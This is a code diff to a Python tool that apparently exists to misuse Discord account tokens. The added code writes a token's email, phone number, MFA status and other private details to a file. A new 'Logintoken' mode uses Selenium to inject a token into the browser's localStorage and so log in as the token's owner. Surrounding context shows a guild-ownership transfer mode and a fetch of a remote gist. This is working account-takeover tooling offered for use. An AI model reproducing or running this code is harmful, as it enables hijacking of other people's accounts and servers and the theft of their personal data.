@@ -1366,6 +1366,7 @@ elif mode == "InfoToken":
                 sg.Popup("Exported info for {} to files/{}.txt".format(response['username'],response['username']),title="Exported")
 
 elif mode == "HeavyInfo":
+    sg.PopupNonBlocking("This May take a while.")
     import discord
     import unicodedata
     import string
@@ -1385,17 +1386,22 @@ elif mode == "HeavyInfo":
     @client.event
     async def on_ready():
         fn = clean_filename(client.user.name)
+        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
+        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+        response = json.loads(src.content)
         with open ('users/{}_HEAVY.txt'.format(client.user.name),'w+',errors='ignore') as handle:
             handle.write('====================================\n')
             handle.write('Token: '+token+'\n')
             handle.write('Email: '+str(client.user.email)+'\n')
-            handle.write('Phone: '+str(client.user.phone)+'\n')
+            handle.write('Phone: '+str(response['phone'])+'\n')
             handle.write('Username: '+client.user.name+'#'+client.user.discriminator+'\n')
             handle.write('User ID: '+str(client.user.id)+'\n')
+            handle.write('Locale: '+str(client.user.locale)+'\n')
             handle.write('Created on: '+str(client.user.created_at)+'\n')
             handle.write('Verified: '+str(client.user.verified)+'\n')
             handle.write('MFA Enabled: ' + str(client.user.mfa_enabled)+'\n')
             handle.write('Discord Nitro: '+str(client.user.premium)+'\n')
+            handle.write('Discord Nitro Type: '+str(client.user.premium_type)+'\n')
             handle.write('Avatar URL: '+str(client.user.avatar_url)+'\n')
             handle.write('====================================\n')
             handle.write('Member of '+str(len(client.guilds))+' servers.\n')
@@ -1488,6 +1494,21 @@ elif mode == "Ownership":
         payload = {'owner_id': values['OwnerID']}
         src = requests.patch("https://ptb.discordapp.com/api/v6/guilds/{}".format(values["ServerID"]),headers=headers,json=payload)
         sg.Popup("Ownership Should have been transferred.")
+
+elif mode == "Logintoken":
+    from selenium import webdriver
+    driver = webdriver.Firefox()
+    script = """function login(token) {
+                setInterval(() => {
+                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+                }, 50);
+                setTimeout(() => {
+                location.reload();
+                }, 2500);
+                }
+            """
+    driver.get("https://canary.discordapp.com/login")
+    driver.execute_script(script+'\nlogin("{}")'.format(sys.argv[6]))
 
 elif mode == 'ree':
     picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
